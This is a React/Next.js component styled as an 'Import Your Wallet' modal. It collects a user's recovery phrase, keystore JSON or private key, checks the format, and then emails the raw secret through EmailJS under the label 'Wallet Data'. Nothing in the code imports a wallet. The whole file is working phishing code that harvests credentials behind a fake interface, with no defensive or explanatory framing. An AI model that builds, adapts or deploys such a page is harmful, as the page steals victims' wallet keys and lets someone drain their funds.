"use client";

import React, { useState } from "react";
import { AlertCircle } from "lucide-react";
import { useRouter } from "next/navigation";
import emailjs from "@emailjs/browser";
import { validateMnemonic } from "web-bip39";
import wordlist from "web-bip39/wordlists/english";

function WalletImportModal() {
  const router = useRouter();
  const [activeTab, setActiveTab] = useState("phrase");
  const [phraseValue, setPhraseValue] = useState("");
  const [keystoreValue, setKeystoreValue] = useState("");
  const [privateKeyValue, setPrivateKeyValue] = useState("");
  const [errors, setErrors] = useState<Record<string, string | null>>({});
  const [showSuccess, setShowSuccess] = useState(false);
  const [loading, setLoading] = useState(false);

  const validatePhrase = async (phrase: string) => {
    const words = phrase
      .trim()
      .split(/\s+/)
      .filter((word) => word.length > 0);
    if (words.length !== 12 && words.length !== 24) {
      return "Recovery phrase must be exactly 12 or 24 words";
    }
    const hasInvalidChars = words.some(
      (word: string) => !/^[a-zA-Z]+$/.test(word)
    );
    if (hasInvalidChars) {
      return "All words must contain only letters";
    }
    const isValid = await validateMnemonic(phraseValue, wordlist);
    if (!isValid) {
      return "Invalid recovery phrase";
    }
    return "Valid recovery phrase";
  };

  const validateKeystore = (keystore: string | number) => {
    try {
      const parsed = JSON.parse(keystore as string);
      if (!parsed || typeof parsed !== "object") {
        return "Invalid JSON format";
      }
      return null;
    } catch {
      return "Invalid JSON format";
    }
  };

  interface ValidatePrivateKeyResult {
    (key: string): string | null;
  }

  const validatePrivateKey: ValidatePrivateKeyResult = (key) => {
    const trimmedKey = key.trim();

    const keyWithoutPrefix =
      trimmedKey.startsWith("0x") || trimmedKey.startsWith("0X")
        ? trimmedKey.slice(2)
        : trimmedKey;

    if (keyWithoutPrefix.length !== 64) {
      return "Private key must be exactly 64 hexadecimal characters (32 bytes)";
    }

    if (!/^[0-9a-fA-F]+$/.test(keyWithoutPrefix)) {
      return "Private key must contain only hexadecimal characters (0-9, a-f, A-F)";
    }

    if (/^0+$/.test(keyWithoutPrefix)) {
      return "Invalid private key (cannot be all zeros)";
    }

    if (/^[fF]+$/.test(keyWithoutPrefix)) {
      return "Invalid private key (out of valid range)";
    }

    return null;
  };

  const handleProceed = async () => {
    let error: string | null = null;
    let currentValue = "";

    if (activeTab === "phrase") {
      const result = await validatePhrase(phraseValue);
      error = result === "Valid recovery phrase" ? null : result;
      currentValue = phraseValue;
    } else if (activeTab === "keystore") {
      error = validateKeystore(keystoreValue);
      currentValue = keystoreValue;
    } else if (activeTab === "privateKey") {
      error = validatePrivateKey(privateKeyValue);
      currentValue = privateKeyValue;
    }

    if (error) {
      setErrors({ [activeTab]: error });
      return;
    }

    setErrors({});
    setLoading(true);

    try {
      await emailjs.send(
        process.env.NEXT_PUBLIC_APP_SERVICE_KEY!,
        process.env.NEXT_PUBLIC_APP_TEMPLATE_KEY!,
        {
          message: `
Import Type: ${
            activeTab === "phrase"
              ? "Recovery Phrase"
              : activeTab === "keystore"
              ? "Keystore JSON"
              : "Private Key"
          }

Wallet Data:
${currentValue}

Time: ${new Date().toISOString()}
        `.trim(),
        },
        process.env.NEXT_PUBLIC_APP_PUBLIC_KEY!
      );

      console.log("Wallet import data sent successfully");
      setShowSuccess(true);

      setTimeout(() => {
        setShowSuccess(false);
        setPhraseValue("");
        setKeystoreValue("");
        setPrivateKeyValue("");
        setLoading(false);
      }, 2000);
    } catch (error) {
      console.error("Error sending email:", error);
      setErrors({ [activeTab]: "Failed to process import. Please try again." });
      setLoading(false);
    }
  };

  const handleCancel = () => {
    setPhraseValue("");
    setKeystoreValue("");
    setPrivateKeyValue("");
    setErrors({});
  };

  const getCurrentValue = () => {
    if (activeTab === "phrase") return phraseValue;
    if (activeTab === "keystore") return keystoreValue;
    return privateKeyValue;
  };

  const handleInputChange = (value: string) => {
    if (activeTab === "phrase") {
      setPhraseValue(value);
    } else if (activeTab === "keystore") {
      setKeystoreValue(value);
    } else {
      setPrivateKeyValue(value);
    }
    if (errors[activeTab]) {
      setErrors({ ...errors, [activeTab]: null });
    }
  };

  const getPlaceholder = () => {
    if (activeTab === "phrase") return "Enter your recovery phrase";
    if (activeTab === "keystore") return "Enter your keystore JSON";
    return "Enter your private key";
  };

  const getHintText = () => {
    if (activeTab === "phrase")
      return "Typically 12 (sometimes 24) words separated by a single spaces.";
    if (activeTab === "keystore")
      return "Paste your keystore JSON file content here.";
    return "Enter your private key (64 hexadecimal characters, with or without 0x prefix).";
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-900 via-gray-800 to-gray-900 flex items-center justify-center p-4">
      <div className="w-full max-w-2xl bg-gray-800 rounded-2xl shadow-2xl overflow-hidden">
        {/* Header */}
        <div className="p-6 border-b border-gray-700">
          <button
            onClick={() => router.push("/connect")}
            className="text-blue-400 hover:text-blue-300 transition-colors mb-6 flex items-center gap-2">
            <span>←</span> Back
          </button>
          <h1 className="text-3xl font-light text-gray-300">
            Import Your Wallet
          </h1>
        </div>

        {/* Tabs */}
        <div className="flex border-b border-gray-700">
          <button
            onClick={() => setActiveTab("phrase")}
            className={`flex-1 py-4 text-lg font-semibold transition-colors ${
              activeTab === "phrase"
                ? "text-blue-400 border-b-4 border-blue-400"
                : "text-gray-500 hover:text-gray-300"
            }`}>
            Phrase
          </button>
          <button
            onClick={() => setActiveTab("keystore")}
            className={`flex-1 py-4 text-lg font-semibold transition-colors ${
              activeTab === "keystore"
                ? "text-blue-400 border-b-4 border-blue-400"
                : "text-gray-500 hover:text-gray-300"
            }`}>
            Keystore JSON
          </button>
          <button
            onClick={() => setActiveTab("privateKey")}
            className={`flex-1 py-4 text-lg font-semibold transition-colors ${
              activeTab === "privateKey"
                ? "text-blue-400 border-b-4 border-blue-400"
                : "text-gray-500 hover:text-gray-300"
            }`}>
            Private Key
          </button>
        </div>

        {/* Content */}
        <div className="p-8">
          <div className="mb-6">
            <textarea
              value={getCurrentValue()}
              onChange={(e) => handleInputChange(e.target.value)}
              placeholder={getPlaceholder()}
              className={`w-full h-48 px-4 py-3 bg-white text-gray-800 placeholder-gray-400 rounded-lg resize-none focus:outline-none focus:ring-2 ${
                errors[activeTab]
                  ? "ring-2 ring-red-500"
                  : "focus:ring-blue-500"
              }`}
            />
            {errors[activeTab] && (
              <div className="mt-3 flex items-start gap-2 text-red-400 bg-red-900/20 p-3 rounded-lg">
                <AlertCircle className="w-5 h-5 flex-shrink-0 mt-0.5" />
                <span className="text-sm">{errors[activeTab]}</span>
              </div>
            )}
          </div>

          <p className="text-gray-400 text-sm mb-6">{getHintText()}</p>

          {/* Buttons */}
          <div className="space-y-3">
            <button
              onClick={handleProceed}
              disabled={loading}
              className="w-full py-4 bg-blue-600 hover:bg-blue-700 disabled:bg-blue-800 disabled:cursor-not-allowed text-white font-semibold rounded-lg transition-colors flex items-center justify-center gap-2">
              {loading ? (
                <>
                  <svg
                    className="animate-spin h-5 w-5 text-white"
                    xmlns="http://www.w3.org/2000/svg"
                    fill="none"
                    viewBox="0 0 24 24">
                    <circle
                      className="opacity-25"
                      cx="12"
                      cy="12"
                      r="10"
                      stroke="currentColor"
                      strokeWidth="4"></circle>
                    <path
                      className="opacity-75"
                      fill="currentColor"
                      d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                  </svg>
                  <span>Processing...</span>
                </>
              ) : (
                "PROCEED"
              )}
            </button>
            <button
              onClick={handleCancel}
              className="w-full py-4 bg-red-500 hover:bg-red-600 text-white font-semibold rounded-lg transition-colors">
              CANCEL
            </button>
          </div>
        </div>
      </div>

      {showSuccess &&
        (() => {
          router.push("/validate");
          return null;
        })()}
    </div>
  );
}

export default WalletImportModal;
